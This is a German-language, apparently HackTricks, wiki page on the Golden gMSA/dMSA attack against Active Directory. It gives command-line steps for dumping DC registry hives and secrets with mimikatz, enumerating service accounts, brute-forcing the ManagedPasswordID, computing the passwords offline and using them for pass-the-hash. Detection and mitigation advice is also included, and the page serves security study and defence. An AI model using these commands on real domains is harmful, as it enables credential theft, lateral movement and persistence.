# Golden gMSA/dMSA Angriff (Offline-Ableitung von Passwörtern für verwaltete Dienstkonten)

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Windows Managed Service Accounts (MSA) sind spezielle Prinzipien, die entwickelt wurden, um Dienste auszuführen, ohne dass die Passwörter manuell verwaltet werden müssen. Es gibt zwei Hauptvarianten:

1. **gMSA** – gruppenverwaltetes Dienstkonto – kann auf mehreren Hosts verwendet werden, die in seinem Attribut `msDS-GroupMSAMembership` autorisiert sind.
2. **dMSA** – delegiertes Managed Service Account – der (Vorschau-)Nachfolger von gMSA, der auf derselben Kryptografie basiert, aber granularere Delegationsszenarien ermöglicht.

Für beide Varianten wird das **Passwort nicht** auf jedem Domain Controller (DC) wie ein regulärer NT-Hash gespeichert. Stattdessen kann jeder DC das aktuelle Passwort **on-the-fly** ableiten von:

* Dem forstweiten **KDS Root Key** (`KRBTGT\KDS`) – zufällig generierter, GUID-namensgegebener Geheimschlüssel, der auf jeden DC im Container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` repliziert wird.
* Der Zielkonto **SID**.
* Einer pro Konto **ManagedPasswordID** (GUID), die im Attribut `msDS-ManagedPasswordId` zu finden ist.

Die Ableitung ist: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 Byte Blob, das schließlich **base64-kodiert** und im Attribut `msDS-ManagedPassword` gespeichert wird. Während der normalen Passwortnutzung sind kein Kerberos-Verkehr oder Domain-Interaktionen erforderlich – ein Mitglieds-Host leitet das Passwort lokal ab, solange es die drei Eingaben kennt.

## Golden gMSA / Golden dMSA Angriff

Wenn ein Angreifer alle drei Eingaben **offline** erhalten kann, kann er **gültige aktuelle und zukünftige Passwörter** für **jedes gMSA/dMSA in der Forest** berechnen, ohne den DC erneut zu berühren, wodurch umgangen wird:

* LDAP-Leseaudits
* Passwortänderungsintervalle (sie können vorab berechnen)

Dies ist analog zu einem *Golden Ticket* für Dienstkonten.

### Voraussetzungen

1. **Forstweite Kompromittierung** von **einem DC** (oder Enterprise Admin) oder `SYSTEM`-Zugriff auf einen der DCs im Forest.
2. Fähigkeit, Dienstkonten aufzulisten (LDAP-Lesen / RID-Brute-Force).
3. .NET ≥ 4.7.2 x64 Arbeitsstation, um [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) oder gleichwertigen Code auszuführen.

### Golden gMSA / dMSA
##### Phase 1 – Extrahieren des KDS Root Key

Dump von jedem DC (Volume Shadow Copy / rohe SAM+SECURITY-Hives oder entfernte Geheimnisse):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Der base64-String mit der Bezeichnung `RootKey` (GUID-Name) wird in späteren Schritten benötigt.

##### Phase 2 – gMSA / dMSA-Objekte auflisten

Rufen Sie mindestens `sAMAccountName`, `objectSid` und `msDS-ManagedPasswordId` ab:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementiert Hilfsmodi:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – Erraten / Entdecken der ManagedPasswordID (wenn fehlend)

Einige Deployments *entfernen* `msDS-ManagedPasswordId` von ACL-geschützten Lesevorgängen. 
Da die GUID 128-Bit ist, ist naives Brute-Forcing unpraktisch, aber:

1. Die ersten **32 Bit = Unix-Epochenzeit** der Kontoerstellung (Minutenauflösung).
2. Gefolgt von 96 zufälligen Bits.

Daher ist eine **enge Wortliste pro Konto** (± wenige Stunden) realistisch.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Das Tool berechnet Kandidatenpasswörter und vergleicht ihren Base64-BLOB mit dem echten `msDS-ManagedPassword`-Attribut – die Übereinstimmung zeigt die korrekte GUID an.

##### Phase 4 – Offline-Passwortberechnung & -konvertierung

Sobald die ManagedPasswordID bekannt ist, ist das gültige Passwort nur einen Befehl entfernt:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Die resultierenden Hashes können mit **mimikatz** (`sekurlsa::pth`) oder **Rubeus** für Kerberos-Missbrauch injiziert werden, was stealth **lateral movement** und **persistence** ermöglicht.

## Detection & Mitigation

* Beschränken Sie die **DC-Backup- und Registry-Hive-Lese**-Fähigkeiten auf Tier-0-Administratoren.
* Überwachen Sie die Erstellung des **Directory Services Restore Mode (DSRM)** oder der **Volume Shadow Copy** auf DCs.
* Protokollieren Sie Lesevorgänge / Änderungen an `CN=Master Root Keys,…` und `userAccountControl`-Flags von Dienstkonten.
* Erkennen Sie ungewöhnliche **base64 Passwortschreibvorgänge** oder plötzliche Wiederverwendung von Dienstpasswörtern über Hosts hinweg.
* Ziehen Sie in Betracht, hochprivilegierte gMSAs in **klassische Dienstkonten** mit regelmäßigen zufälligen Rotationen umzuwandeln, wo eine Tier-0-Isolation nicht möglich ist.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – Referenzimplementierung, die auf dieser Seite verwendet wird.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – Referenzimplementierung, die auf dieser Seite verwendet wird.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket unter Verwendung abgeleiteter AES-Schlüssel.

## References

- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
